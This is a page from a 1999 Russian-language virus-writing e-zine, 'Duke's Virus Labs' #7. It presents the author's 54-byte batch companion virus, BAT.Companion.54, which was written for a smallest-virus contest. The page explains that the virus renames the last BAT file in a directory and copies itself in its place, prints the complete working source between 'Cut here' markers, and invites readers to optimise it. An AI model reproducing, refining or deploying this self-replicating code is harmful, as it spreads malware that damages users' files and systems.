- [Duke's Virus Labs #7] - [Page 06] -

BAT.Companion.54
(c) by Duke/SMF

Имя вируса    : BAT.Companion.54
Автор         : Duke/SMF
Язык прогр.   : Batch
Дата создания : 25.05.99

   В середине мая'99 в конференции RELCOM.COMP.VIRUS проводился конкурс на
самый маленький компаньон вирус. (также о конкурсе читайте в статье 24).
На этот конкурс я хотел представить BAT-вирус, но вирусы на ASM оказались
мельче ;-) Тем не менее был написан достаточно маленький BAT-вирус (много
меньше, чем некоторые оверврайты на BAT'е ;-)) . Он ищет последний BAT-файл
текущего каталога, переименовывает его в файл без расширения, а на его место
копируется сам. Все это уместилось в 54 байта. Кто оптимизирует ? ;-)))

===== Cut here =====
for %%a in (*.b*) do set a=%%a
ren %a% *.|copy %0 %a%
===== Cut here =====

